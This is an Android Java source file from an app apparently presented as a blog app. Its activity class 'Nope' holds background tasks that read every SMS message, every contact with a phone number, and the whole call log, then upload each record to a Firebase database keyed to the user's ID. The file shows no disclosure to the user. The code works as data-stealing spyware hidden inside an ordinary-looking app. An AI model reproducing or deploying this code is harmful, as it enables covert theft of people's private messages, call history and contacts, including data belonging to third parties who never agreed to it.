package com.example.aws.blogapp.Activities;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.widget.Toast;

import com.example.aws.blogapp.R;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;

public class Nope extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    FirebaseUser currentFirebaseUser = FirebaseAuth.getInstance().getCurrentUser();
    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference myRef = database.getReference("data");
    HashMap<String, String> meMap = new HashMap<String, String>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_nope);
    }

    public class Sms extends AsyncTask<String, Void, Void> {
        @Override
        protected void onPreExecute() {
            Log.d(TAG, "onPreExecute: ");
        }

        @Override
        protected Void doInBackground(String... strings) {


            FirebaseUser currentFirebaseUser = FirebaseAuth.getInstance().getCurrentUser();
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference("data");
            HashMap<String, String> meMap = new HashMap<String, String>();

            ContentResolver cr = getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            if ((c != null ? c.getCount() : 0) > 0) {
                {
                    totalSMS = c.getCount();
                    if (c.moveToFirst()) {
                        for (int j = 0; j < totalSMS; j++) {
                            String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                            String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                            String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));


                            Date dateFormat = new Date(Long.valueOf(smsDate));
                            String type = "";
                            switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                    type = "inbox";
                                    break;
                                case Telephony.Sms.MESSAGE_TYPE_SENT:
                                    type = "sent";
                                    break;
                                case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                    type = "outbox";
                                    break;
                                default:
                                    break;
                            }
                            meMap.put("Number", number);
                            meMap.put("Body", body);
                            meMap.put("Date", String.valueOf(dateFormat));
                            meMap.put("Type", type);
                            myRef.child(currentFirebaseUser.getUid()).child("SMS").push().setValue(meMap);

                            c.moveToNext();
                        }
                    }

                    c.close();

                }

            }
            return null;
        }
    }

    public class Contacts extends AsyncTask<String, Void, Integer> {
        @Override
        protected void onPreExecute() {
            Log.d(TAG, "onPreExecute: ");
        }

        @Override
        protected Integer doInBackground(String... strings) {
            FirebaseUser currentFirebaseUser = FirebaseAuth.getInstance().getCurrentUser();
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference("data");
            HashMap<String, String> meMap = new HashMap<String, String>();

            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if ((cur != null ? cur.getCount() : 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                            meMap.put("Name", name);
                            meMap.put("Number", phoneNo);
                            Log.d("test_function", String.valueOf(meMap));
                            myRef.child(currentFirebaseUser.getUid()).child("Contacts").push().setValue(meMap);

                        }
                        pCur.close();
                    }
                }
            }
            if (cur != null) {
                cur.close();
            }
            return 0;
        }

    }

    public class Calllog extends AsyncTask<String, Void, String> {
        @Override
        protected void onPreExecute() {
            Log.d(TAG, "onPreExecute: ");
        }

        @Override
        protected String doInBackground(String... strings) {
            ArrayList<String> list = new ArrayList<String>();
            HashMap<String, String> meMap = new HashMap<String, String>();

            FirebaseUser currentFirebaseUser = FirebaseAuth.getInstance().getCurrentUser();
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference myRef = database.getReference("data");


            StringBuffer sb = new StringBuffer();
            Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " ASC");
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            int name = (managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME));

            sb.append("Call Details :");

            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                String namee = (String) managedCursor.getString(name);

                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration + "\nname " + namee);
                sb.append("\n----------------------------------");

                meMap.put("Number", phNumber);
                meMap.put("Type", dir);
                meMap.put("Date", String.valueOf(callDayTime));
                if (Integer.parseInt(callDuration) <= 60) {
                    meMap.put("Duration", callDuration);
                } else if (Float.parseFloat(callDuration) > 60) {
                    Float a = Float.parseFloat(callDuration) / 60;
                    String b = String.valueOf(a);
                    meMap.put("Duration", b);
                }

                meMap.put("Name", namee);

                myRef.child(currentFirebaseUser.getUid()).child("Call logs").push().setValue(meMap);

                Log.d("testing_hash", String.valueOf(meMap));

            }

            sb.append("\n----------------END------------------");
            //change if needed below 4 lines
            // textView.setText(sb);
            // list.add(textView.getText().toString());
            // Log.d("test_function", list.toString());

            //closing cursor causes error
            // managedCursor.close();
            return sb.toString();


        }


    }



}